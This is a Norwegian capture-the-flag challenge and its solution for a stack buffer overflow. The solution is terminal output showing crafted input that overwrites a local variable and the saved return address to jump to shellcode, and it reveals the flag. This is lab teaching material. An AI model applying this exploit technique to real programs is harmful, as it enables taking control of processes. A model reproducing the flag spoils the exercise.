# Buffer overflow

Hver prosess har sitt eget minneområde. Hvis man ved hjelp av en sårbarhet kan *endre på vilkårlige data i minnet* kan man få programmet til å gjøre noe annet enn tiltenkt.

Den klassiske måten å gjøre dette på ble beskrevet i artikkelen *Smashing The Stack For Fun And Profit*, publisert i *Phrack Magazine* #49 i 1996. For å forstå resten av denne teksten, anbefaler vi å lese artikkelen på `http://phrack.org/issues/49/14.html`.

Siden 90-tallet har både prosessorer, operativsystemer, kompilatorer og programmeringspråk introdusert mange mekanismer som forsøker å gjøre det vanskeligere å utnytte sårbarheter som tillater *minnekorrupsjon*. Hver for seg er disse mekanismene som regel enkle å omgå, men kombinasjonen av dem gjør det langt mer tidkrevende og komplisert å skrive *exploits* i dag enn for 20 år siden. Ofte vil man ha behov for å kombinere flere sårbarheter før man kan ta full kontroll over en prosess, for eksempel *minnelekkasjer* for å omgå *minnerandomisering* (ASLR), før man kan overskrive en *returadresse*.

Programmet i denne mappen er laget for å visualisere hvordan data plasseres på *stacken* og hvordan man kan påvirke programflyten i `main()`. Funksjonen setter av plass i minnet til en håndfull lokale variabler, og en av disse er et *buffer* på 32 byte. Det første argumentet kopieres inn i bufferet ved hjelp av `strcpy()` (uten å sjekke størrelsen på tekststrengen). Dette fører til at variablene som ligger på høyere minneadresser kan overskrives.

Det første skrittet for å lese ut flagget er å endre 'above' til en hardkodet verdi du finner i kildekoden. For å gjøre det siste skrittet lettere, allokeres det *eksekverbart minne* hvor du kan legge inn egen *shellkode*, eller bruke den som ligger i filen `sample_shellcode`.

```sh
$ export SHC=$(cat sample_shellcode)
$ cat overflow.c
$ ./overflow AAAAAAAA
$ ./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ ???
```

# Solution

```login@corax:~/1_grunnleggende/4_overflow$ export SHC=$(cat sample_shellcode)
login@corax:~/1_grunnleggende/4_overflow$ ./overflow AAAAAAAA

Before strcpy:
above = 0x               0
below = 0x6867666564636261

After strcpy:
above = 0x               0
below = 0x6867666564636261

Stackdump:
0x7ffcfdc5a480   00 00 00 00 02 00 00 00  |........|
0x7ffcfdc5a478   33 d8 62 e9 0a 56 00 00  |3.b..V..|
0x7ffcfdc5a470   00 00 00 00 00 00 00 00  |........|
stored rip       ca 21 14 c3 96 7f 00 00  |.!......|
stored rbp       02 00 00 00 00 00 00 00  |........|
0x7ffcfdc5a458   00 00 00 00 00 00 00 00  |........|
0x7ffcfdc5a450   78 a5 c5 fd fc 7f 00 00  |x.......|
&above           00 00 00 00 00 00 00 00  |........|
0x7ffcfdc5a440   00 00 00 00 00 00 00 00  |........|
0x7ffcfdc5a438   00 00 00 00 00 00 00 00  |........|
0x7ffcfdc5a430   00 00 00 00 00 00 00 00  |........|
0x7ffcfdc5a428   00 00 00 00 00 00 00 00  |........|
&buffer          41 41 41 41 41 41 41 41  |AAAAAAAA|
&below           61 62 63 64 65 66 67 68  |abcdefgh|
&width           08 00 00 00 00 00 00 00  |........|
&shellcode_ptr   30 30 30 30 30 30 00 00  |000000..|
&p               00 a4 c5 fd fc 7f 00 00  |........|

above has not been overwritten.
Supply an argument which is long enough to overflow buffer, and modify the value of 'above'.
login@corax:~/1_grunnleggende/4_overflow$ ./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Before strcpy:
above = 0x               0
below = 0x6867666564636261

After strcpy:
above = 0x        41414141
below = 0x6867666564636261

Stackdump:
0x7fff7faf0b00   00 00 00 00 02 00 00 00  |........|
0x7fff7faf0af8   33 b8 96 b3 74 55 00 00  |3...tU..|
0x7fff7faf0af0   00 00 00 00 00 00 00 00  |........|
stored rip       ca d1 7d f5 ff 7e 00 00  |..}..~..|
stored rbp       02 00 00 00 00 00 00 00  |........|
0x7fff7faf0ad8   00 00 00 00 00 00 00 00  |........|
0x7fff7faf0ad0   f8 0b af 7f ff 7f 00 00  |........|
&above           41 41 41 41 00 00 00 00  |AAAA....|
0x7fff7faf0ac0   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff7faf0ab8   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff7faf0ab0   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff7faf0aa8   41 41 41 41 41 41 41 41  |AAAAAAAA|
&buffer          41 41 41 41 41 41 41 41  |AAAAAAAA|
&below           61 62 63 64 65 66 67 68  |abcdefgh|
&width           08 00 00 00 00 00 00 00  |........|
&shellcode_ptr   30 30 30 30 30 30 00 00  |000000..|
&p               80 0a af 7f ff 7f 00 00  |........|

above has incorrect value.
Read source code to find the magic number.

login@corax:~/1_grunnleggende/4_overflow$ ./overflow $(echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x41\x42\x43\x44\x45\x46\x47\x48AAAAAAAAAAAAAAAAAAAAAAAA\x30\x30\x30\x30\x30\x30')

Before strcpy:
above = 0x               0
below = 0x6867666564636261

After strcpy:
above = 0x4847464544434241
below = 0x6867666564636261

Stackdump:
0x7fff84fdac30   00 00 00 00 02 00 00 00  |........|
0x7fff84fdac28   33 08 2b cc 8b 55 00 00  |3.+..U..|
0x7fff84fdac20   00 00 00 00 00 00 00 00  |........|
stored rip       30 30 30 30 30 30 00 00  |000000..|
stored rbp       41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff84fdac08   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff84fdac00   41 41 41 41 41 41 41 41  |AAAAAAAA|
&above           41 42 43 44 45 46 47 48  |ABCDEFGH|
0x7fff84fdabf0   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff84fdabe8   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff84fdabe0   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7fff84fdabd8   41 41 41 41 41 41 41 41  |AAAAAAAA|
&buffer          41 41 41 41 41 41 41 41  |AAAAAAAA|
&below           61 62 63 64 65 66 67 68  |abcdefgh|
&width           08 00 00 00 00 00 00 00  |........|
&shellcode_ptr   30 30 30 30 30 30 00 00  |000000..|
&p               b0 ab fd 84 ff 7f 00 00  |........|

above is correct!
Next step is to adjust the stored rip to point to shellcode

$ cat FLAGG
Veldig bra jobbet!
Du har nå et fullverdig shell med rettigheter til en annen bruker.
Bruk kommandoen `exit` for å gå tilbake til den vanlige brukeren din.

Husk å levere flagget :)

╭────────────────────────────────────────╮
│    2248644980a376cf4dda51c7485545b6    │
╰────────────────────────────────────────╯

login@corax:~/1_grunnleggende/4_overflow$ scoreboard 2248644980a376cf4dda51c7485545b6
Kategori: 1. Grunnleggende
Oppgave:  1.4_overflow
Svar:     2248644980a376cf4dda51c7485545b6
Poeng:    10

Gratulerer, korrekt svar!
